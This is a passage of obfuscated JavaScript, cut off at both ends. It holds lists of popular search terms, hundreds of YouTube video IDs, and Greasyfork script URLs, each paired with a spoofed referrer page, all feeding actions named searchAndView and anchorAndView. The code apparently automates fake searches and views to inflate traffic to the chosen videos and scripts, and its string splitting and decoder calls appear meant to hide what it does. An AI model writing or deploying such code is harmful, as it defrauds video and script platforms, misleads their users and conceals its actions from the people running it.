searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1eb5 + 0x1 * 0x133a + 0xb85)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xc66 + -0x11d2 + 0xe9 * 0x6)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x939 * -0x3 + -0x20c + 0x1dba);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    a2(0x1f) + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    a2(0x10) + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    Z(0x23, 'bUZ9') + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    Z(0x1c, 'X9I1') + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    Z(0xa, '0Y4[') + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + Z(0x0, '0Y4['),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + a2(0x8)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a3(0xb) + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + Z(0x13, 'bUZ9') + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + a2(0x1) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + Z(0x15, '8s0i') + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
